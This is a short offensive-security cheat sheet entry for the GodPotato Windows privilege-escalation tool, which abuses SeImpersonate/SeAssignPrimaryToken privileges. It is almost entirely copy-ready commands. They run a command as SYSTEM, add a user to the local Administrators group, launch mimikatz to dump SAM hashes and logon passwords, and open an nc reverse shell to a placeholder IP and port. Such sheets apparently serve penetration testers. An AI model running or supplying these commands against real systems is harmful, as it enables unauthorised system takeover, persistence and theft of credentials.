# GodPotato

% SeAssignPrimaryToken, SeImpersonate, token
#plateform/windows #target/local #cat/PRIVESC/TOKEN


## test 
https://github.com/BeichenDream/GodPotato
```powershell
.\GodPotato.exe -cmd "cmd /c whoami"
```

## add administrator 
https://github.com/BeichenDream/GodPotato
```powershell
.\GodPotato.exe -cmd  "net localgroup Administrators <domain_netbios>\<user> /add"
```

## mimikatz 
https://github.com/BeichenDream/GodPotato
```cmd
.\GodPotato.exe -cmd  'cmd /c c:\temp\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "sekurlsa::logonpasswords /all" "exit"'
```


## revshell 
https://github.com/BeichenDream/GodPotato
```cmd
.\GodPotato.exe -cmd  "<nc_exe_path> <ip> <port> -e powershell"
```